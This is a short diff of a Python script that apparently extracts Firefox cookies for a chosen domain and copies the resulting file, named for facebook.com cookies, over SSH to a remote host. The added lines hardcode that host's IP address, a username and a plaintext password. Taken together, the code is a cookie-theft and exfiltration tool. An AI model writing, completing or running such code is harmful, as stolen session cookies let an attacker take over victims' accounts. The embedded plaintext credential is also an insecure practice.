@@ -47,14 +47,14 @@ if __name__ == "__main__":
     get_firefox_cookies(domain_input)
 
 # SSH Credentials
-hostname = "<ip>"
+hostname = "192.168.1.7"
 port = 22
-username = "user"
-password = "pwd"  # Or use private key authentication
+username = "scp"
+password = "Super@123"  # Or use private key authentication
 
 # File to transfer
 local_file = "C:/temp/firefox_cookies_facebook.com.json"
-remote_path = "/home/zoyzie/Documents"
+remote_path = "/tmp/"
 
 # 🔌 Create SSH client and connect
 ssh = paramiko.SSHClient()
